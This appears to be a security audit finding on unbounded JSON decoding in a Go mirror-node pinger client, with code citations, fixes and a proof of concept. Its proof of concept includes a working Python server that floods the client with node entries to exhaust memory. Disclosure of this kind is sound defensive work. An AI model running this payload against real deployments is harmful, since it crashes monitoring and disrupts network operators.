### Title
Unbounded JSON Response Deserialization in `fetchMirrorNodeNetwork()` Enables Memory Exhaustion DoS

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` decodes the HTTP response body from the configured mirror REST endpoint with no size cap and iterates over the resulting `nodes` array with no count limit. An attacker who can serve a response from the mirror REST URL — via HTTP interception, DNS poisoning, or compromise of the mirror service — can return a JSON payload with millions of `nodes` entries, causing the pinger process to allocate unbounded memory and crash, halting all transaction confirmation.

### Finding Description
**Exact code path:** `pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, lines 95–124.

```go
// line 95-98: no io.LimitReader, no body size cap
var payload nodesEnvelope
if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
    return nil, false, fmt.Errorf("decode mirror nodes: %w", err)
}

// line 100-124: no cap on len(payload.Nodes)
network := make(map[string]hiero.AccountID)
for _, n := range payload.Nodes {
    ...
    for _, ep := range n.ServiceEndpoints {
        ...
        network[addr] = nodeAccountId   // unbounded map growth
    }
}
```

**Root cause:** `json.NewDecoder(resp.Body).Decode(&payload)` reads directly from the raw response body. There is no `io.LimitReader` wrapping, no `Content-Length` validation, and no cap on `len(payload.Nodes)` or `len(n.ServiceEndpoints)`. The `nodesEnvelope` struct's `Nodes []nodeEntry` field will grow to whatever size the server returns.

**Why the HTTP timeout is insufficient:** `cfg.mirrorNodeClientTimeout` (default 10 s, line 46 of `mirror_node_client.go`) limits total round-trip time, but a fast server on a local or cloud network can stream hundreds of megabytes of JSON within that window. The Go JSON decoder processes data as it arrives, so memory is allocated progressively throughout the 10-second window.

**Failed assumption:** The code implicitly trusts that the mirror REST endpoint will return a reasonably sized payload. No defensive bound is enforced in the client itself.

### Impact Explanation
If the pinger process is OOM-killed or panics due to memory exhaustion, it stops submitting and confirming transactions entirely. This directly maps to the stated critical scope: "Network not being able to confirm new transactions (total network shutdown)" for any deployment relying on this pinger for liveness monitoring. The crash is immediate and repeatable — the attacker can trigger it on every retry attempt (up to `mirrorNodeClientMaxRetries + 1` times, default 11), each time consuming memory before the process dies.

### Likelihood Explanation
The precondition is that the attacker can influence what the mirror REST URL returns. This is achievable without privileged access to the pinger itself via:

1. **HTTP interception (most realistic):** The default example URL is `http://mirror-rest:5551` — plaintext HTTP. Any attacker with network adjacency (same Kubernetes namespace, same VPC, compromised sidecar) can perform a MITM and substitute the response body.
2. **DNS poisoning:** The hostname `mirror-rest` is resolved at runtime; poisoning the in-cluster DNS record redirects all requests to an attacker-controlled server.
3. **Compromised mirror REST service:** If the upstream mirror node REST API is itself compromised, the attacker controls the response directly.

None of these require any credentials or privileges within the pinger process itself.

### Recommendation
1. **Wrap the response body with `io.LimitReader`** before passing it to the JSON decoder, e.g.:
   ```go
   const maxBodyBytes = 10 * 1024 * 1024 // 10 MB
   limited := io.LimitReader(resp.Body, maxBodyBytes+1)
   if err := json.NewDecoder(limited).Decode(&payload); err != nil { ... }
   // then check if limit was hit
   ```
2. **Cap the number of nodes processed**, e.g. reject or truncate if `len(payload.Nodes) > 1000`.
3. **Enforce TLS** for the mirror REST URL; reject `http://` schemes to eliminate plaintext MITM.
4. **Validate `Content-Length`** before reading: if the header reports a value exceeding the limit, abort immediately.

### Proof of Concept
**Preconditions:** Attacker can intercept or serve responses for the configured `mirrorRest` URL (e.g., via DNS poisoning or HTTP MITM on the cluster network).

**Steps:**
1. Stand up a server at the mirror REST address that responds to `GET /api/v1/network/nodes` with:
   ```python
   import json, http.server, socketserver

   class H(http.server.BaseHTTPRequestHandler):
       def do_GET(self):
           self.send_response(200)
           self.send_header("Content-Type", "application/json")
           self.end_headers()
           # Stream a JSON array with millions of node entries
           self.wfile.write(b'{"nodes":[')
           entry = json.dumps({
               "node_account_id": "0.0.3",
               "service_endpoints": [{"domain_name": "x.example.com", "ip_address_v4": "", "port": 50211}] * 100,
               "grpc_proxy_endpoint": None
           }).encode()
           for i in range(500_000):
               self.wfile.write(entry + b",")
           self.wfile.write(b'{}],"links":{}}')

   socketserver.TCPServer(("0.0.0.0", 5551), H).serve_forever()
   ```
2. Start the pinger with `HIERO_MIRROR_PINGER_NETWORK=other` and `HIERO_MIRROR_PINGER_REST=http://<attacker-ip>:5551`.
3. Observe the pinger process consuming gigabytes of RAM within the 10-second HTTP timeout window and being OOM-killed, with all transaction confirmation halted. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** pinger/mirror_node_client.go (L46-46)
```go
	httpClient := &http.Client{Timeout: cfg.mirrorNodeClientTimeout}
```

**File:** pinger/mirror_node_client.go (L95-98)
```go
	var payload nodesEnvelope
	if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
		return nil, false, fmt.Errorf("decode mirror nodes: %w", err)
	}
```

**File:** pinger/mirror_node_client.go (L100-124)
```go
	network := make(map[string]hiero.AccountID)

	for _, n := range payload.Nodes {
		if n.NodeAccountID == "" {
			continue
		}

		nodeAccountId, err := hiero.AccountIDFromString(n.NodeAccountID)
		if err != nil {
			continue
		}

		// Use service_endpoints for node gRPC (what the SDK wants)
		for _, ep := range n.ServiceEndpoints {
			host := strings.TrimSpace(ep.DomainName)
			if host == "" {
				host = strings.TrimSpace(ep.IPAddressV4)
			}
			if host == "" || ep.Port == 0 {
				continue
			}

			addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
			network[addr] = nodeAccountId
		}
```

**File:** pinger/config.go (L90-95)
```go
	mirrorNodeClientTimeoutStr := envOr("HIERO_MIRROR_PINGER_MIRROR_NODE_CLIENT_TIMEOUT", "10s")
	flag.DurationVar(
		&cfg.mirrorNodeClientTimeout,
		"mirror-node-client-retry-timeout",
		toDuration(mirrorNodeClientTimeoutStr),
		"HTTP timeout for mirror node client requests (e.g. 2s, 10s)")
```
